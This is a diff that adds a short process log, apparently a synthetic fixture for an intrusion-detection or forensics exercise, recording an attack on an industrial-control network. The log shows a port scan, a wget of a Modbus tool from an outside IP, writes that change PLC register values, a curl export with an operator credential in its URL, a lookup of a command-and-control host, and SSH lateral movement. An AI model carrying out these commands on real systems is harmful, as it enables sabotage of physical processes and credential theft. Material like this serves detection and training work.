@@ -1,1 +1,12 @@
 
+2025-03-28 23:41:10,engineer-ws,sshd,user=maintenance,pid=4522,cmd="/usr/sbin/sshd -D [priv]"
+2025-03-28 23:41:15,engineer-ws,bash,user=maintenance,pid=4525,cmd="-bash"
+2025-03-28 23:41:32,engineer-ws,python3,user=maintenance,pid=4530,cmd="python3 /tmp/scan.py --target 172.31.37.30 --ports 22,80,443,502"
+2025-03-28 23:44:05,engineer-ws,wget,user=maintenance,pid=4535,cmd="wget -O /tmp/modbus.py http://185.142.236.35/tools/modbus.py"
+2025-03-28 23:44:45,engineer-ws,chmod,user=maintenance,pid=4536,cmd="chmod +x /tmp/modbus.py"
+2025-03-28 23:45:02,engineer-ws,python3,user=maintenance,pid=4537,cmd="python3 /tmp/modbus.py --target 172.31.37.30 --function 16 --register 4032 --value 115"
+2025-03-28 23:48:15,engineer-ws,python3,user=maintenance,pid=4538,cmd="python3 /tmp/modbus.py --target 172.31.37.30 --function 16 --register 4033 --value 300"
+2025-03-28 23:48:55,engineer-ws,python3,user=maintenance,pid=4539,cmd="python3 /tmp/modbus.py --target 172.31.37.30 --function 16 --register 4034 --value 1"
+2025-03-28 23:50:05,engineer-ws,curl,user=maintenance,pid=4540,cmd="curl -o /tmp/history_export.dat http://172.31.37.30/api/export?token=operator:Op3r4t0r"
+2025-03-28 23:55:05,engineer-ws,nslookup,user=maintenance,pid=4545,cmd="nslookup c2.attacker.com"
+2025-03-28 23:58:22,engineer-ws,ssh,user=maintenance,pid=4550,cmd="ssh operator@172.31.64.25"
